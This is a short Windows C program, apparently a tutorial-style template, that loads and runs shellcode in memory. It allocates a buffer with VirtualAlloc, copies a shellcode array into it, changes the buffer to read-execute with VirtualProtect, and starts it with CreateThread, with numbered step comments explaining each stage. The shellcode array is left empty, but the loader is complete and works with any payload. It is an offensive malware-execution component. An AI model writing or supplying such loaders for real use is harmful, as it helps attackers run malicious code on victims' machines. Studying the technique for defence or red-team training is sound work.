// Step 1 - First we will create the memory space (for shellcode) in the current process.

// Step 2 - copy the shellcode in the allocated memory locations.

// Step 3 - Change the memory space permission to "read-execute".

// Step 4 - Create a thread and execute.

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// shellcode
unsigned char shellcode[] = {
};

unsigned int payloadLen = sizeof(shellcode); // shellcode length

int main(void)
{
    void *memoryBuffer;   // pointer to memory buffer
    BOOL rv;              // return value
    HANDLE th;            // thread handel
    DWORD oldprotect = 0; // old protection

    // Allocate a memory buffer for payload
    memoryBuffer = VirtualAlloc(0, payloadLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // Memory is commited and reserved with "read and write" permission.

    // copy payload to memory buffer
    RtlMoveMemory(memoryBuffer, shellcode, payloadLen);

    // make new buffer as executable
    // VirtualProtect protect the old memory and also changes the permission
    rv = VirtualProtect(memoryBuffer, payloadLen, PAGE_EXECUTE_READ, &oldprotect); // Permission changed to "read and execute"

    if (rv != 0)
    {
        // run payload
        th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)memoryBuffer, 0, 0, 0);
        WaitForSingleObject(th, -1);
    }
    return 0;
}

// DWORD(Double Word) has unsigned int functionality